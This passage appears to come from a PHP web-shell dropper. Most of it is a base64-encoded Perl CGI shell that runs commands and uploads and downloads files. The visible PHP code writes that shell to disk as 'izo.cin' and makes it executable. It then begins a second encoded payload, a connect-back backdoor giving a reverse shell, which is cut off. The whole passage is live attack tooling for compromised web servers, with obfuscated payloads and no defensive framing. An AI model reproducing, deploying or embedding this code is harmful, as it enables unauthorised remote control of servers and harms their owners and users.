GN5QmpZVzV1YjNRZ1ltVWdaR2x6Y0d4aGVXVmtMZzBLSXkwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUTBLYzNWaUlFVjRaV04xZEdWRGIyMXRZVzVrRFFwN0RRb0phV1lvSkZKMWJrTnZiVzFoYm1RZ1BYNGdiUzllWEhNcVkyUmNjeXNvTGlzcEx5a2dJeUJwZENCcGN5QmhJR05vWVc1blpTQmthWElnWTI5dGJXRnVaQTBLQ1hzTkNna0pJeUIzWlNCamFHRnVaMlVnZEdobElHUnBjbVZqZEc5eWVTQnBiblJsY201aGJHeDVMaUJVYUdVZ2IzVjBjSFYwSUc5bUlIUm9aUTBLQ1FraklHTnZiVzFoYm1RZ2FYTWdibTkwSUdScGMzQnNZWGxsWkM0TkNna0pEUW9KQ1NSUGJHUkVhWElnUFNBa1EzVnljbVZ1ZEVScGNqc05DZ2tKSkVOdmJXMWhibVFnUFNBaVkyUWdYQ0lrUTNWeWNtVnVkRVJwY2x3aUlpNGtRMjFrVTJWd0xpSmpaQ0FrTVNJdUpFTnRaRk5sY0M0a1EyMWtVSGRrT3cwS0NRbGphRzl3S0NSRGRYSnlaVzUwUkdseUlEMGdZQ1JEYjIxdFlXNWtZQ2s3RFFvSkNTWlFjbWx1ZEZCaFoyVklaV0ZrWlhJb0ltTWlLVHNOQ2drSkpGQnliMjF3ZENBOUlDUlhhVzVPVkNBL0lDSWtUMnhrUkdseVBpQWlJRG9nSWx0aFpHMXBibHhBSkZObGNuWmxjazVoYldVZ0pFOXNaRVJwY2wxY0pDQWlPdzBLQ1Fsd2NtbHVkQ0FpSkZCeWIyMXdkQ0FrVW5WdVEyOXRiV0Z1WkNJN0RRb0pmUTBLQ1dWc2MyVWdJeUJ6YjIxbElHOTBhR1Z5SUdOdmJXMWhibVFzSUdScGMzQnNZWGtnZEdobElHOTFkSEIxZEEwS0NYc05DZ2tKSmxCeWFXNTBVR0ZuWlVobFlXUmxjaWdpWXlJcE93MEtDUWtrVUhKdmJYQjBJRDBnSkZkcGJrNVVJRDhnSWlSRGRYSnlaVzUwUkdseVBpQWlJRG9nSWx0aFpHMXBibHhBSkZObGNuWmxjazVoYldVZ0pFTjFjbkpsYm5SRWFYSmRYQ1FnSWpzTkNna0pjSEpwYm5RZ0lpUlFjbTl0Y0hRZ0pGSjFia052YlcxaGJtUThlRzF3UGlJN0RRb0pDU1JEYjIxdFlXNWtJRDBnSW1Oa0lGd2lKRU4xY25KbGJuUkVhWEpjSWlJdUpFTnRaRk5sY0M0a1VuVnVRMjl0YldGdVpDNGtVbVZrYVhKbFkzUnZjanNOQ2drSmFXWW9JU1JYYVc1T1ZDa05DZ2tKZXcwS0NRa0pKRk5KUjNzblFVeFNUU2Q5SUQwZ1hDWkRiMjF0WVc1a1ZHbHRaVzkxZERzTkNna0pDV0ZzWVhKdEtDUkRiMjF0WVc1a1ZHbHRaVzkxZEVSMWNtRjBhVzl1S1RzTkNna0pmUTBLQ1FscFppZ2tVMmh2ZDBSNWJtRnRhV05QZFhSd2RYUXBJQ01nYzJodmR5QnZkWFJ3ZFhRZ1lYTWdhWFFnYVhNZ1oyVnVaWEpoZEdWa0RRb0pDWHNOQ2drSkNTUjhQVEU3RFFvSkNRa2tRMjl0YldGdVpDQXVQU0FpSUh3aU93MEtDUWtKYjNCbGJpaERiMjF0WVc1a1QzVjBjSFYwTENBa1EyOXRiV0Z1WkNrN0RRb0pDUWwzYUdsc1pTZzhRMjl0YldGdVpFOTFkSEIxZEQ0cERRb0pDUWw3RFFvSkNRa0pKRjhnUFg0Z2N5OG9YRzU4WEhKY2Jpa2tMeTg3RFFvSkNRa0pjSEpwYm5RZ0lpUmZYRzRpT3cwS0NRa0pmUTBLQ1FrSkpIdzlNRHNOQ2drSmZRMEtDUWxsYkhObElDTWdjMmh2ZHlCdmRYUndkWFFnWVdaMFpYSWdZMjl0YldGdVpDQmpiMjF3YkdWMFpYTU5DZ2tKZXcwS0NRa0pjSEpwYm5RZ1lDUkRiMjF0WVc1a1lEc05DZ2tKZlEwS0NRbHBaaWdoSkZkcGJrNVVLUTBLQ1FsN0RRb0pDUWxoYkdGeWJTZ3dLVHNOQ2drSmZRMEtDUWx3Y21sdWRDQWlQQzk0YlhBK0lqc05DZ2w5RFFvSkpsQnlhVzUwUTI5dGJXRnVaRXhwYm1WSmJuQjFkRVp2Y20wN0RRb0pKbEJ5YVc1MFVHRm5aVVp2YjNSbGNqc05DbjBOQ2cwS0l5MHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFEwS0l5QlVhR2x6SUdaMWJtTjBhVzl1SUdScGMzQnNZWGx6SUhSb1pTQndZV2RsSUhSb1lYUWdZMjl1ZEdGcGJuTWdZU0JzYVc1cklIZG9hV05vSUdGc2JHOTNjeUIwYUdVZ2RYTmxjZzBLSXlCMGJ5QmtiM2R1Ykc5aFpDQjBhR1VnYzNCbFkybG1hV1ZrSUdacGJHVXVJRlJvWlNCd1lXZGxJR0ZzYzI4Z1kyOXVkR0ZwYm5NZ1lTQmhkWFJ2TFhKbFpuSmxjMmdOQ2lNZ1ptVmhkSFZ5WlNCMGFHRjBJSE4wWVhKMGN5QjBhR1VnWkc5M2JteHZZV1FnWVhWMGIyMWhkR2xqWVd4c2VTNE5DaU1nUVhKbmRXMWxiblFnTVRvZ1JuVnNiSGtnY1hWaGJHbG1hV1ZrSUdacGJHVnVZVzFsSUc5bUlIUm9aU0JtYVd4bElIUnZJR0psSUdSdmQyNXNiMkZrWldRTkNpTXRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwTkNuTjFZaUJRY21sdWRFUnZkMjVzYjJGa1RHbHVhMUJoWjJVTkNuc05DZ2xzYjJOaGJDZ2tSbWxzWlZWeWJDa2dQU0JBWHpzTkNnbHBaaWd0WlNBa1JtbHNaVlZ5YkNrZ0l5QnBaaUIwYUdVZ1ptbHNaU0JsZUdsemRITU5DZ2w3RFFvSkNTTWdaVzVqYjJSbElIUm9aU0JtYVd4bElHeHBibXNnYzI4Z2QyVWdZMkZ1SUhObGJtUWdhWFFnZEc4Z2RHaGxJR0p5YjNkelpYSU5DZ2tKSkVacGJHVlZjbXdnUFg0Z2N5OG9XMTVoTFhwQkxWb3dMVGxkS1M4bkpTY3VkVzV3WVdOcktDSklLaUlzSkRFcEwyVm5PdzBLQ1Fra1JHOTNibXh2WVdSTWFXNXJJRDBnSWlSVFkzSnBjSFJNYjJOaGRHbHZiajloUFdSdmQyNXNiMkZrSm1ZOUpFWnBiR1ZWY213bWJ6MW5ieUk3RFFvSkNTUklkRzFzVFdWMFlVaGxZV1JsY2lBOUlDSThiV1YwWVNCSVZGUlFMVVZSVlVsV1BWd2lVbVZtY21WemFGd2lJRU5QVGxSRlRsUTlYQ0l4T3lCVlVrdzlKRVJ2ZDI1c2IyRmtUR2x1YTF3aVBpSTdEUW9KQ1NaUWNtbHVkRkJoWjJWSVpXRmtaWElvSW1NaUtUc05DZ2tKY0hKcGJuUWdQRHhGVGtRN0RRbzhZMjlrWlQ0TkNnMEtVMlZ1WkdsdVp5QkdhV3hsSUNSVWNtRnVjMlpsY2tacGJHVXVMaTQ4WW5JK0RRcEpaaUIwYUdVZ1pHOTNibXh2WVdRZ1pHOWxjeUJ1YjNRZ2MzUmhjblFnWVhWMGIyMWhkR2xqWVd4c2VTd05DanhoSUdoeVpXWTlJaVJFYjNkdWJHOWhaRXhwYm1zaVBrTnNhV05ySUVobGNtVThMMkUrTGcwS1JVNUVEUW9KQ1NaUWNtbHVkRU52YlcxaGJtUk1hVzVsU1c1d2RYUkdiM0p0T3cwS0NRa21VSEpwYm5SUVlXZGxSbTl2ZEdWeU93MEtDWDBOQ2dsbGJITmxJQ01nWm1sc1pTQmtiMlZ6YmlkMElHVjRhWE4wRFFvSmV3MEtDUWttVUhKcGJuUlFZV2RsU0dWaFpHVnlLQ0ptSWlrN0RRb0pDWEJ5YVc1MElDSkdZV2xzWldRZ2RHOGdaRzkzYm14dllXUWdKRVpwYkdWVmNtdzZJQ1FoSWpzTkNna0pKbEJ5YVc1MFJtbHNaVVJ2ZDI1c2IyRmtSbTl5YlRzTkNna0pKbEJ5YVc1MFVHRm5aVVp2YjNSbGNqc05DZ2w5RFFwOURRb05DaU10TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTME5DaU1nVkdocGN5Qm1kVzVqZEdsdmJpQnlaV0ZrY3lCMGFHVWdjM0JsWTJsbWFXVmtJR1pwYkdVZ1puSnZiU0IwYUdVZ1pHbHpheUJoYm1RZ2MyVnVaSE1nYVhRZ2RHOGdkR2hsRFFvaklHSnliM2R6WlhJc0lITnZJSFJvWVhRZ2FYUWdZMkZ1SUdKbElHUnZkMjVzYjJGa1pXUWdZbmtnZEdobElIVnpaWEl1RFFvaklFRnlaM1Z0Wlc1MElERTZJRVoxYkd4NUlIRjFZV3hwWm1sbFpDQndZWFJvYm1GdFpTQnZaaUIwYUdVZ1ptbHNaU0IwYnlCaVpTQnpaVzUwTGcwS0l5MHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFEwS2MzVmlJRk5sYm1SR2FXeGxWRzlDY205M2MyVnlEUXA3RFFvSmJHOWpZV3dvSkZObGJtUkdhV3hsS1NBOUlFQmZPdzBLQ1dsbUtHOXdaVzRvVTBWT1JFWkpURVVzSUNSVFpXNWtSbWxzWlNrcElDTWdabWxzWlNCdmNHVnVaV1FnWm05eUlISmxZV1JwYm1jTkNnbDdEUW9KQ1dsbUtDUlhhVzVPVkNrTkNna0pldzBLQ1FrSlltbHViVzlrWlNoVFJVNUVSa2xNUlNrN0RRb0pDUWxpYVc1dGIyUmxLRk5VUkU5VlZDazdEUW9KQ1gwTkNna0pKRVpwYkdWVGFYcGxJRDBnS0hOMFlYUW9KRk5sYm1SR2FXeGxLU2xiTjEwN0RRb0pDU2drUm1sc1pXNWhiV1VnUFNBa1UyVnVaRVpwYkdVcElEMStJQ0J0SVNoYlhpOWVYRnhkS2lra0lUc05DZ2tKY0hKcGJuUWdJa052Ym5SbGJuUXRWSGx3WlRvZ1lYQndiR2xqWVhScGIyNHZlQzExYm10dWIzZHVYRzRpT3cwS0NRbHdjbWx1ZENBaVEyOXVkR1Z1ZEMxTVpXNW5kR2c2SUNSR2FXeGxVMmw2WlZ4dUlqc05DZ2tKY0hKcGJuUWdJa052Ym5SbGJuUXRSR2x6Y0c5emFYUnBiMjQ2SUdGMGRHRmphRzFsYm5RN0lHWnBiR1Z1WVcxbFBTUXhYRzVjYmlJN0RRb0pDWEJ5YVc1MElIZG9hV3hsS0R4VFJVNUVSa2xNUlQ0cE93MEtDUWxqYkc5elpTaFRSVTVFUmtsTVJTazdEUW9KZlEwS0NXVnNjMlVnSXlCbVlXbHNaV1FnZEc4Z2IzQmxiaUJtYVd4bERRb0pldzBLQ1FrbVVISnBiblJRWVdkbFNHVmhaR1Z5S0NKbUlpazdEUW9KQ1hCeWFXNTBJQ0pHWVdsc1pXUWdkRzhnWkc5M2JteHZZV1FnSkZObGJtUkdhV3hsT2lBa0lTSTdEUW9KQ1NaUWNtbHVkRVpwYkdWRWIzZHViRzloWkVadmNtMDdEUW9OQ2drSkpsQnlhVzUwVUdGblpVWnZiM1JsY2pzTkNnbDlEUXA5RFFvTkNnMEtJeTB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExRMEtJeUJVYUdseklHWjFibU4wYVc5dUlHbHpJR05oYkd4bFpDQjNhR1Z1SUhSb1pTQjFjMlZ5SUdSdmQyNXNiMkZrY3lCaElHWnBiR1V1SUVsMElHUnBjM0JzWVhseklHRWdiV1Z6YzJGblpRMEtJeUIwYnlCMGFHVWdkWE5sY2lCaGJtUWdjSEp2ZG1sa1pYTWdZU0JzYVc1cklIUm9jbTkxWjJnZ2QyaHBZMmdnZEdobElHWnBiR1VnWTJGdUlHSmxJR1J2ZDI1c2IyRmtaV1F1RFFvaklGUm9hWE1nWm5WdVkzUnBiMjRnYVhNZ1lXeHpieUJqWVd4c1pXUWdkMmhsYmlCMGFHVWdkWE5sY2lCamJHbGphM01nYjI0Z2RHaGhkQ0JzYVc1ckxpQkpiaUIwYUdseklHTmhjMlVzRFFvaklIUm9aU0JtYVd4bElHbHpJSEpsWVdRZ1lXNWtJSE5sYm5RZ2RHOGdkR2hsSUdKeWIzZHpaWEl1RFFvakxTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0RFFwemRXSWdRbVZuYVc1RWIzZHViRzloWkEwS2V3MEtDU01nWjJWMElHWjFiR3g1SUhGMVlXeHBabWxsWkNCd1lYUm9JRzltSUhSb1pTQm1hV3hsSUhSdklHSmxJR1J2ZDI1c2IyRmtaV1FOQ2dscFppZ29KRmRwYms1VUlDWWdLQ1JVY21GdWMyWmxja1pwYkdVZ1BYNGdiUzllWEZ4OFhpNDZMeWtwSUh3TkNna0pLQ0VrVjJsdVRsUWdKaUFvSkZSeVlXNXpabVZ5Um1sc1pTQTlmaUJ0TDE1Y0x5OHBLU2tnSXlCd1lYUm9JR2x6SUdGaWMyOXNkWFJsRFFvSmV3MEtDUWtrVkdGeVoyVjBSbWxzWlNBOUlDUlVjbUZ1YzJabGNrWnBiR1U3RFFvSmZRMEtDV1ZzYzJVZ0l5QndZWFJvSUdseklISmxiR0YwYVhabERRb0pldzBLQ1FsamFHOXdLQ1JVWVhKblpYUkdhV3hsS1NCcFppZ2tWR0Z5WjJWMFJtbHNaU0E5SUNSRGRYSnlaVzUwUkdseUtTQTlmaUJ0TDF0Y1hGd3ZYU1F2T3cwS0NRa2tWR0Z5WjJWMFJtbHNaU0F1UFNBa1VHRjBhRk5sY0M0a1ZISmhibk5tWlhKR2FXeGxPdzBLQ1gwTkNnMEtDV2xtS0NSUGNIUnBiMjV6SUdWeElDSm5ieUlwSUNNZ2QyVWdhR0YyWlNCMGJ5QnpaVzVrSUhSb1pTQm1hV3hsRFFvSmV3MEtDUWttVTJWdVpFWnBiR1ZVYjBKeWIzZHpaWElvSkZSaGNtZGxkRVpwYkdVcE93MEtDWDBOQ2dsbGJITmxJQ01nZDJVZ2FHRjJaU0IwYnlCelpXNWtJRzl1YkhrZ2RHaGxJR3hwYm1zZ2NHRm5aUTBLQ1hzTkNna0pKbEJ5YVc1MFJHOTNibXh2WVdSTWFXNXJVR0ZuWlNna1ZHRnlaMlYwUm1sc1pTazdEUW9KZlEwS2ZRMEtEUW9qTFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHREUW9qSUZSb2FYTWdablZ1WTNScGIyNGdhWE1nWTJGc2JHVmtJSGRvWlc0Z2RHaGxJSFZ6WlhJZ2QyRnVkSE1nZEc4Z2RYQnNiMkZrSUdFZ1ptbHNaUzRnU1dZZ2RHaGxEUW9qSUdacGJHVWdhWE1nYm05MElITndaV05wWm1sbFpDd2dhWFFnWkdsemNHeGhlWE1nWVNCbWIzSnRJR0ZzYkc5M2FXNW5JSFJvWlNCMWMyVnlJSFJ2SUhOd1pXTnBabmtnWVEwS0l5Qm1hV3hsTENCdmRHaGxjbmRwYzJVZ2FYUWdjM1JoY25SeklIUm9aU0IxY0d4dllXUWdjSEp2WTJWemN5NE5DaU10TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTME5Dbk4xWWlCVmNHeHZZV1JHYVd4bERRcDdEUW9KSXlCcFppQnVieUJtYVd4bElHbHpJSE53WldOcFptbGxaQ3dnY0hKcGJuUWdkR2hsSUhWd2JHOWhaQ0JtYjNKdElHRm5ZV2x1RFFvSmFXWW9KRlJ5WVc1elptVnlSbWxzWlNCbGNTQWlJaWtOQ2dsN0RRb0pDU1pRY21sdWRGQmhaMlZJWldGa1pYSW9JbVlpS1RzTkNna0pKbEJ5YVc1MFJtbHNaVlZ3Ykc5aFpFWnZjbTA3RFFvSkNTWlFjbWx1ZEZCaFoyVkdiMjkwWlhJN0RRb0pDWEpsZEhWeWJqc05DZ2w5RFFvSkpsQnlhVzUwVUdGblpVaGxZV1JsY2lnaVl5SXBPdzBLRFFvSkl5QnpkR0Z5ZENCMGFHVWdkWEJzYjJGa2FXNW5JSEJ5YjJObGMzTU5DZ2x3Y21sdWRDQWlWWEJzYjJGa2FXNW5JQ1JVY21GdWMyWmxja1pwYkdVZ2RHOGdKRU4xY25KbGJuUkVhWEl1TGk0OFluSStJanNOQ2cwS0NTTWdaMlYwSUhSb1pTQm1kV3hzYkhrZ2NYVmhiR2xtYVdWa0lIQmhkR2h1WVcxbElHOW1JSFJvWlNCbWFXeGxJSFJ2SUdKbElHTnlaV0YwWldRTkNnbGphRzl3S0NSVVlYSm5aWFJPWVcxbEtTQnBaaUFvSkZSaGNtZGxkRTVoYldVZ1BTQWtRM1Z5Y21WdWRFUnBjaWtnUFg0Z2JTOWJYRnhjTDEwa0x6c05DZ2trVkhKaGJuTm1aWEpHYVd4bElEMStJRzBoS0Z0ZUwxNWNYRjBxS1NRaE93MEtDU1JVWVhKblpYUk9ZVzFsSUM0OUlDUlFZWFJvVTJWd0xpUXhPdzBLRFFvSkpGUmhjbWRsZEVacGJHVlRhWHBsSUQwZ2JHVnVaM1JvS0NScGJuc25abWxzWldSaGRHRW5mU2s3RFFvSkl5QnBaaUIwYUdVZ1ptbHNaU0JsZUdsemRITWdZVzVrSUhkbElHRnlaU0J1YjNRZ2MzVndjRzl6WldRZ2RHOGdiM1psY25keWFYUmxJR2wwRFFvSmFXWW9MV1VnSkZSaGNtZGxkRTVoYldVZ0ppWWdKRTl3ZEdsdmJuTWdibVVnSW05MlpYSjNjbWwwWlNJcERRb0pldzBLQ1Fsd2NtbHVkQ0FpUm1GcGJHVmtPaUJFWlhOMGFXNWhkR2x2YmlCbWFXeGxJR0ZzY21WaFpIa2daWGhwYzNSekxqeGljajRpT3cwS0NYME5DZ2xsYkhObElDTWdabWxzWlNCcGN5QnViM1FnY0hKbGMyVnVkQTBLQ1hzTkNna0phV1lvYjNCbGJpaFZVRXhQUVVSR1NVeEZMQ0FpUGlSVVlYSm5aWFJPWVcxbElpa3BEUW9KQ1hzTkNna0pDV0pwYm0xdlpHVW9WVkJNVDBGRVJrbE1SU2tnYVdZZ0pGZHBiazVVT3cwS0NRa0pjSEpwYm5RZ1ZWQk1UMEZFUmtsTVJTQWthVzU3SjJacGJHVmtZWFJoSjMwN0RRb0pDUWxqYkc5elpTaFZVRXhQUVVSR1NVeEZLVHNOQ2drSkNYQnlhVzUwSUNKVWNtRnVjMlpsY21Wa0lDUlVZWEpuWlhSR2FXeGxVMmw2WlNCQ2VYUmxjeTQ4WW5JK0lqc05DZ2tKQ1hCeWFXNTBJQ0pHYVd4bElGQmhkR2c2SUNSVVlYSm5aWFJPWVcxbFBHSnlQaUk3RFFvSkNYME5DZ2tKWld4elpRMEtDUWw3RFFvSkNRbHdjbWx1ZENBaVJtRnBiR1ZrT2lBa0lUeGljajRpT3cwS0NRbDlEUW9KZlEwS0NYQnlhVzUwSUNJaU93MEtDU1pRY21sdWRFTnZiVzFoYm1STWFXNWxTVzV3ZFhSR2IzSnRPdzBLRFFvSkpsQnlhVzUwVUdGblpVWnZiM1JsY2pzTkNuME5DZzBLSXkwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUTBLSXlCVWFHbHpJR1oxYm1OMGFXOXVJR2x6SUdOaGJHeGxaQ0IzYUdWdUlIUm9aU0IxYzJWeUlIZGhiblJ6SUhSdklHUnZkMjVzYjJGa0lHRWdabWxzWlM0Z1NXWWdkR2hsRFFvaklHWnBiR1Z1WVcxbElHbHpJRzV2ZENCemNHVmphV1pwWldRc0lHbDBJR1JwYzNCc1lYbHpJR0VnWm05eWJTQmhiR3h2ZDJsdVp5QjBhR1VnZFhObGNpQjBieUJ6Y0dWamFXWjVJR0VOQ2lNZ1ptbHNaU3dnYjNSb1pYSjNhWE5sSUdsMElHUnBjM0JzWVhseklHRWdiV1Z6YzJGblpTQjBieUIwYUdVZ2RYTmxjaUJoYm1RZ2NISnZkbWxrWlhNZ1lTQnNhVzVyRFFvaklIUm9jbTkxWjJnZ0lIZG9hV05vSUhSb1pTQm1hV3hsSUdOaGJpQmlaU0JrYjNkdWJHOWhaR1ZrTGcwS0l5MHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFEwS2MzVmlJRVJ2ZDI1c2IyRmtSbWxzWlEwS2V3MEtDU01nYVdZZ2JtOGdabWxzWlNCcGN5QnpjR1ZqYVdacFpXUXNJSEJ5YVc1MElIUm9aU0JrYjNkdWJHOWhaQ0JtYjNKdElHRm5ZV2x1RFFvSmFXWW9KRlJ5WVc1elptVnlSbWxzWlNCbGNTQWlJaWtOQ2dsN0RRb0pDU1pRY21sdWRGQmhaMlZJWldGa1pYSW9JbVlpS1RzTkNna0pKbEJ5YVc1MFJtbHNaVVJ2ZDI1c2IyRmtSbTl5YlRzTkNna0pKbEJ5YVc1MFVHRm5aVVp2YjNSbGNqc05DZ2tKY21WMGRYSnVPdzBLQ1gwTkNna05DZ2tqSUdkbGRDQm1kV3hzZVNCeGRXRnNhV1pwWldRZ2NHRjBhQ0J2WmlCMGFHVWdabWxzWlNCMGJ5QmlaU0JrYjNkdWJHOWhaR1ZrRFFvSmFXWW9LQ1JYYVc1T1ZDQW1JQ2drVkhKaGJuTm1aWEpHYVd4bElEMStJRzB2WGx4Y2ZGNHVPaThwS1NCOERRb0pDU2doSkZkcGJrNVVJQ1lnS0NSVWNtRnVjMlpsY2tacGJHVWdQWDRnYlM5ZVhDOHZLU2twSUNNZ2NHRjBhQ0JwY3lCaFluTnZiSFYwWlEwS0NYc05DZ2tKSkZSaGNtZGxkRVpwYkdVZ1BTQWtWSEpoYm5ObVpYSkdhV3hsT3cwS0NYME5DZ2xsYkhObElDTWdjR0YwYUNCcGN5QnlaV3hoZEdsMlpRMEtDWHNOQ2drSlkyaHZjQ2drVkdGeVoyVjBSbWxzWlNrZ2FXWW9KRlJoY21kbGRFWnBiR1VnUFNBa1EzVnljbVZ1ZEVScGNpa2dQWDRnYlM5YlhGeGNMMTBrTHpzTkNna0pKRlJoY21kbGRFWnBiR1VnTGowZ0pGQmhkR2hUWlhBdUpGUnlZVzV6Wm1WeVJtbHNaVHNOQ2dsOURRb05DZ2xwWmlna1QzQjBhVzl1Y3lCbGNTQWlaMjhpS1NBaklIZGxJR2hoZG1VZ2RHOGdjMlZ1WkNCMGFHVWdabWxzWlEwS0NYc05DZ2tKSmxObGJtUkdhV3hsVkc5Q2NtOTNjMlZ5S0NSVVlYSm5aWFJHYVd4bEtUc05DZ2w5RFFvSlpXeHpaU0FqSUhkbElHaGhkbVVnZEc4Z2MyVnVaQ0J2Ym14NUlIUm9aU0JzYVc1cklIQmhaMlVOQ2dsN0RRb0pDU1pRY21sdWRFUnZkMjVzYjJGa1RHbHVhMUJoWjJVb0pGUmhjbWRsZEVacGJHVXBPdzBLQ1gwTkNuME5DZzBLSXkwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUTBLSXlCTllXbHVJRkJ5YjJkeVlXMGdMU0JGZUdWamRYUnBiMjRnVTNSaGNuUnpJRWhsY21VTkNpTXRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0TFMwTkNpWlNaV0ZrVUdGeWMyVTdEUW9tUjJWMFEyOXZhMmxsY3pzTkNnMEtKRk5qY21sd2RFeHZZMkYwYVc5dUlEMGdKRVZPVm5zblUwTlNTVkJVWDA1QlRVVW5mVHNOQ2lSVFpYSjJaWEpPWVcxbElEMGdKRVZPVm5zblUwVlNWa1ZTWDA1QlRVVW5mVHNOQ2lSTWIyZHBibEJoYzNOM2IzSmtJRDBnSkdsdWV5ZHdKMzA3RFFva1VuVnVRMjl0YldGdVpDQTlJQ1JwYm5zbll5ZDlPdzBLSkZSeVlXNXpabVZ5Um1sc1pTQTlJQ1JwYm5zblppZDlPdzBLSkU5d2RHbHZibk1nUFNBa2FXNTdKMjhuZlRzTkNnMEtKRUZqZEdsdmJpQTlJQ1JwYm5zbllTZDlPdzBLSkVGamRHbHZiaUE5SUNKc2IyZHBiaUlnYVdZb0pFRmpkR2x2YmlCbGNTQWlJaWs3SUNNZ2JtOGdZV04wYVc5dUlITndaV05wWm1sbFpDd2dkWE5sSUdSbFptRjFiSFFOQ2cwS0l5Qm5aWFFnZEdobElHUnBjbVZqZEc5eWVTQnBiaUIzYUdsamFDQjBhR1VnWTI5dGJXRnVaSE1nZDJsc2JDQmlaU0JsZUdWamRYUmxaQTBLSkVOMWNuSmxiblJFYVhJZ1BTQWthVzU3SjJRbmZUc05DbU5vYjNBb0pFTjFjbkpsYm5SRWFYSWdQU0JnSkVOdFpGQjNaR0FwSUdsbUtDUkRkWEp5Wlc1MFJHbHlJR1Z4SUNJaUtUc05DZzBLSkV4dloyZGxaRWx1SUQwZ0pFTnZiMnRwWlhON0oxTkJWa1ZFVUZkRUozMGdaWEVnSkZCaGMzTjNiM0prT3cwS0RRcHBaaWdrUVdOMGFXOXVJR1Z4SUNKc2IyZHBiaUlnZkh3Z0lTUk1iMmRuWldSSmJpa2dJeUIxYzJWeUlHNWxaV1J6TDJoaGN5QjBieUJzYjJkcGJnMEtldzBLQ1NaUVpYSm1iM0p0VEc5bmFXNDdEUW9OQ24wTkNtVnNjMmxtS0NSQlkzUnBiMjRnWlhFZ0ltTnZiVzFoYm1RaUtTQWpJSFZ6WlhJZ2QyRnVkSE1nZEc4Z2NuVnVJR0VnWTI5dGJXRnVaQTBLZXcwS0NTWkZlR1ZqZFhSbFEyOXRiV0Z1WkRzTkNuME5DbVZzYzJsbUtDUkJZM1JwYjI0Z1pYRWdJblZ3Ykc5aFpDSXBJQ01nZFhObGNpQjNZVzUwY3lCMGJ5QjFjR3h2WVdRZ1lTQm1hV3hsRFFwN0RRb0pKbFZ3Ykc5aFpFWnBiR1U3RFFwOURRcGxiSE5wWmlna1FXTjBhVzl1SUdWeElDSmtiM2R1Ykc5aFpDSXBJQ01nZFhObGNpQjNZVzUwY3lCMGJ5QmtiM2R1Ykc5aFpDQmhJR1pwYkdVTkNuc05DZ2ttUkc5M2JteHZZV1JHYVd4bE93MEtmUTBLWld4emFXWW9KRUZqZEdsdmJpQmxjU0FpYkc5bmIzVjBJaWtnSXlCMWMyVnlJSGRoYm5SeklIUnZJR3h2WjI5MWRBMEtldzBLQ1NaUVpYSm1iM0p0VEc5bmIzVjBPdzBLZlE9PSc7CgokZmlsZSA9IGZvcGVuKCJpem8uY2luIiAsIncrIik7CiR3cml0ZSA9IGZ3cml0ZSAoJGZpbGUgLGJhc2U2NF9kZWNvZGUoJGNnaXNoZWxsaXpvY2luKSk7CmZjbG9zZSgkZmlsZSk7CiAgICBjaG1vZCgiaXpvLmNpbiIsMDc1NSk7CiRuZXRjYXRzaGVsbCA9ICdJeUV2ZFhOeUwySnBiaTl3WlhKc0RRb2dJQ0FnSUNCMWMyVWdVMjlqYTJWME93MEtJQ0FnSUNBZ2NISnBiblFnSWtSaGRHRWdRMmhoCk1ITWdRMjl1Ym1WamRDQkNZV05ySUVKaFkydGtiMjl5WEc1Y2JpSTdEUW9nSUNBZ0lDQnBaaUFvSVNSQlVrZFdXekJkS1NCN0RRb2cKSUNBZ0lDQWdJSEJ5YVc1MFppQWlWWE5oWjJVNklDUXdJRnRJYjNOMFhTQThVRzl5ZEQ1Y2